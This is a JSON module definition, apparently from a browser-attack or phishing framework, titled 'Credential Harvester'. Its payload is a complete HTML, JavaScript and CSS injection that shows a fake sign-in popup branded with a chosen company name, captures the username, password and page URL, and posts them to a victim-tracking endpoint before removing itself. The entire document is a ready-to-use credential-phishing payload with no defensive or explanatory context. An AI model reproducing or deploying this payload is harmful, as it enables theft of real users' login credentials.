{
  "name": "Credential Harvester",
  "description": "Displays fake login popup to harvest credentials",
  "category": "Credential Harvesting",
  "icon": "",
  "inputs": [
    {
      "id": 0,
      "label": "Company Name",
      "type": "string",
      "required": true
    }
  ],
  "payload": "<div class=\"login-box\"><div class=\"login-logo\">🔐</div><h2 class=\"login-title\">Sign In</h2><p class=\"login-subtitle\">Enter your credentials to continue</p><form id=\"loginForm\"><div class=\"login-field\"><label class=\"login-label\" for=\"username\">Username or Email</label><input class=\"login-input\" type=\"text\" id=\"username\" name=\"username\" required></div><div class=\"login-field\"><label class=\"login-label\" for=\"password\">Password</label><input class=\"login-input\" type=\"password\" id=\"password\" name=\"password\" required></div><button type=\"submit\" class=\"login-btn\">Sign In</button></form><p class=\"login-footer\">{{ params[0] }} © 2026</p></div><script>(function(){document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var u=document.getElementById('username').value;var p=document.getElementById('password').value;var btn=this.querySelector('.login-btn');btn.textContent='Signing in...';btn.disabled=true;var moduleId='{{module_id}}';fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{username:u,password:p,url:window.location.href,timestamp:new Date().toISOString()}})}).finally(function(){__removeModule();});});})();</script><style>.login-box{background:#fff;border-radius:12px;padding:36px;max-width:400px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,0.3);animation:popIn .3s ease-out;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}.login-logo{font-size:44px;text-align:center;margin-bottom:16px}.login-title{text-align:center;color:#333;margin:0 0 6px;font-size:22px}.login-subtitle{text-align:center;color:#666;margin:0 0 24px;font-size:14px}.login-field{margin-bottom:16px}.login-label{display:block;margin-bottom:6px;color:#333;font-weight:500;font-size:14px}.login-input{width:100%;padding:10px 12px;border:2px solid #e0e0e0;border-radius:6px;font-size:14px;box-sizing:border-box;outline:none;transition:border-color .2s}.login-input:focus{border-color:#667eea}.login-btn{width:100%;padding:12px;background:#667eea;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}.login-btn:hover{background:#5a6fd6}.login-btn:disabled{opacity:.7;cursor:default}.login-footer{text-align:center;color:#999;font-size:12px;margin:20px 0 0}@keyframes popIn{from{opacity:0;transform:scale(.9) translateY(-10px)}to{opacity:1;transform:scale(1) translateY(0)}}</style>",
  "link": "c/{{victim_id}}"
}